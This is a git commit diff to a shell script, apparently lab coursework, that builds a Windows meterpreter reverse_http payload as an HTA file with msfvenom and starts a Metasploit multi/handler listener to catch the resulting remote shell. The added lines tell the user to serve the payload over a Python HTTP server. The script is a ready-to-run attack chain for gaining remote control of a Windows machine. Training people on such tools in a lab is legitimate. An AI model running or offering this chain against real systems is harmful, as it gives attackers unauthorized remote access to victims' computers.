d91d6c88a1d20af5364c7a7369cec3f8442486bf
Nicholas Spagnola <39714515+EvaStanAccount@users.noreply.github.com>
2024-03-26 10:56:04 -0400

    Update week11.sh

--- Week11/week11.sh
+++ Week11/week11.sh
@@ -3,5 +3,10 @@ echo "[+] what is your IP"
 ifconfig eth0
 read ipaddr
 
+echo "[+] Copy the following command, you will need to run this in a new terminal tab or terminal window"
+echo "python3 -m http.server 8080"
+echo "[+] Did you copy the command? If yes, press enter to continue"
+read abc
+
 msfvenom -p windows/meterpreter/reverse_http LHOST=$ipaddr LPORT=8000 -f hta-psh | tee -a payload.hta
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_http;set LHOST $ipaddr; set LPORT 8000; run"
